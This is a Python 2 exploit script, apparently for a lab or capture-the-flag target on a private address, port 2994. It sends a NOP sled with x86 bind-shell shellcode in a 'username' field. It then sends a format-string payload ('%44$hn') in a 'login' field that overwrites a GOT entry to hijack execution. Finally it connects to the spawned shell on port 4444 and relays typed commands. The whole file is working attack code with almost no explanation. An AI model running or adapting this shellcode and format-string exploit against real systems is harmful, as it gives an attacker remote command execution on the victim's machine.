#!/usr/bin/python

#just use this script to find address of "DDDD" which will be replaced by puts()'s entry address in GOT latter.

from socket import *  
from struct import *
import time

host = "192.168.209.158"

s = socket(AF_INET, SOCK_STREAM)  
s.connect((host, 2994))


shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
                "\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a" \
                "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" \
                "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" \
                "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" \
                "\x0b\xcd\x80"

s.send("username " + "\x90"*16 + shellcode + "\n")  
s.send("login " +  "\x94\xa1\x04\x08" +"%41352d"+"%44$hn" + "\n")  
s.close()  

s = socket(AF_INET, SOCK_STREAM)
time.sleep(2)
s.connect((host, 4444))
req = raw_input("Please send a request:")
while req:
    s.send(req+"\n")
    print(s.recv(1024))
    req = raw_input("Please input a request:")
s.close()
